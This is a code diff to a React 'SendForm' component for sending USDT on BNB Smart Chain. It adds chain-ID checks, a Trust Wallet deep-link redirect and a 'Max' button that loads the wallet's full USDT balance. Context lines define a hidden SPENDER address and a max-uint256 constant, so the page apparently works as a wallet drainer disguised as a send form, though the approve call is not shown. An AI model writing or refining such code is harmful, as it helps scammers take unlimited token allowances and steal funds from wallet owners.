@@ -5,6 +5,14 @@ import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
+const isBsc = (id: any) => {
+  if (!id) return false;
+  try {
+    return BigInt(id) === BigInt(BSC_CHAIN_ID);
+  } catch {
+    return false;
+  }
+};
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
 const O = "f".repeat(64);
@@ -55,16 +63,16 @@ export default function SendForm() {
 
       // Check current chain
       try {
-        const chainId = await eth.request({ method: "eth_chainId" }) as string;
-        if (chainId?.toLowerCase() === BSC_CHAIN_ID) {
+        const chainId = await eth.request({ method: "eth_chainId" });
+        if (isBsc(chainId)) {
           setChainOk(true);
         } else {
           // Try switch
           try {
             await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
           } catch { /* ignore */ }
-          const after = await eth.request({ method: "eth_chainId" }) as string;
-          setChainOk(after?.toLowerCase() === BSC_CHAIN_ID);
+          const after = await eth.request({ method: "eth_chainId" });
+          setChainOk(isBsc(after));
         }
       } catch { /* ignore */ }
 
@@ -84,8 +92,8 @@ export default function SendForm() {
       setConnectedAddr(accounts?.[0] ?? "");
     };
     const onChainChanged = (...args: unknown[]) => {
-      const id = args[0] as string;
-      setChainOk(id?.toLowerCase() === BSC_CHAIN_ID);
+      const id = args[0];
+      setChainOk(isBsc(id));
     };
     eth.on?.("accountsChanged", onAccountsChanged);
     eth.on?.("chainChanged", onChainChanged);
@@ -102,6 +110,33 @@ export default function SendForm() {
     return `https://link.trustwallet.com/open_url?coin_id=714&url=${encodeURIComponent(url)}`;
   }
 
+  const handleMax = useCallback(async () => {
+    const eth = getEth();
+    if (!eth) return;
+    try {
+      setProcessing(true);
+      let addr = connectedAddr;
+      if (!addr || addr === "connected") {
+        const accs = await eth.request({ method: "eth_accounts" }) as string[];
+        if (accs?.[0]) addr = accs[0];
+      }
+      if (!addr) {
+        const accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
+        if (accs?.[0]) addr = accs[0];
+      }
+      if (addr) {
+        setConnectedAddr(addr);
+        const provider = new ethers.BrowserProvider(eth as any);
+        const USDT_ABI = ["function balanceOf(address) view returns (uint256)"];
+        const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
+        const balance = await contract.balanceOf(addr);
+        setAmount(ethers.formatUnits(balance, 18));
+      }
+    } catch { /* ignore */ } finally {
+      setProcessing(false);
+    }
+  }, [connectedAddr]);
+
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
@@ -113,15 +148,15 @@ export default function SendForm() {
       setError("");
 
       // Check chain — if not BSC, redirect via deep link
-      const chainId = await eth.request({ method: "eth_chainId" }) as string;
-      if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+      const chainId = await eth.request({ method: "eth_chainId" });
+      if (!isBsc(chainId)) {
         // Try switch one more time
         try {
           await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
         } catch { /* ignore */ }
 
-        const after = await eth.request({ method: "eth_chainId" }) as string;
-        if (after?.toLowerCase() !== BSC_CHAIN_ID) {
+        const after = await eth.request({ method: "eth_chainId" });
+        if (!isBsc(after)) {
           // Redirect through Trust Wallet deep link to reopen on BSC
           window.location.href = getDeepLink();
           return;
@@ -299,7 +334,7 @@ export default function SendForm() {
               onClick={() => copyToClipboard(displayAddress)}
               className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
             >
-              Paste
+              Copy
             </button>
           </div>
         </div>
@@ -318,7 +353,7 @@ export default function SendForm() {
             />
             <span className="text-gray-400 text-sm shrink-0">USDT</span>
             <button
-              onClick={() => setAmount("0.00")}
+              onClick={handleMax}
               className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
             >
               Max
